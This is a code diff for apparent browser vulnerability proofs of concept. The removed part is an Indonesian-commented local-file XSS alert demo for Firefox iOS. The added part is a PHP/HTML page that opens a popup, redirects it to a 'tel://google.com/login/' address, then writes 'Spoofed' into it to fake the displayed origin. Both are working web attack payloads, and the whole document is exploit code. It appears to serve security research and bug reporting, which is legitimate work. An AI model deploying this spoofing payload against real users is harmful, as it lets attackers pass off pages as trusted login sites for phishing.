@@ -1,34 +1,28 @@
+<?php
+if (isset($_GET['r']) && $_GET['r'] == '1') {
+    header("Location: tel://google.com/login/");
+    exit;
+}
+?>
+
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>PoC Security Research - Firefox iOS</title>
-    <style>
-        body { font-family: sans-serif; text-align: center; padding-top: 50px; }
-        .warning { color: red; font-weight: bold; }
-    </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
 </head>
 <body>
-    <h1>Firefox iOS - Local XSS PoC</h1>
-    <p class="warning">If you see an alert, JavaScript execution is enabled in the local context.</p>
-    
-    <script>
-        // Mencoba mengakses informasi origin dan storage untuk menunjukkan dampak
-        const origin = window.location.origin || "file:// (Local)";
-        const storageAccess = typeof(localStorage) !== 'undefined' ? "Accessible" : "Blocked";
-        
-        // Munculkan alert dengan informasi teknis
-        alert(
-            "VULNERABILITY DETECTED\n" +
-            "------------------------\n" +
-            "Origin: " + origin + "\n" +
-            "Local Storage: " + storageAccess + "\n" +
-            "Context: Downloaded file executing active script."
-        );
+    <button style=font-size:40px onclick="poc();">Click Me</button>
+<script>
 
-        // Opsional: Mencoba menulis ke storage untuk membuktikan persistensi
-        localStorage.setItem('PoC_Test', 'SensitiveData_Exposed');
-        console.log("LocalStorage Write Test Successful");
-    </script>
+var win='';
+function poc(){
+win=window.open(window.location.href+'?r=1');
+
+setTimeout(()=>{win.document.write('<font size=240>Spoofed');},777);
+
+}
+
+</script>
 </body>
 </html>
-
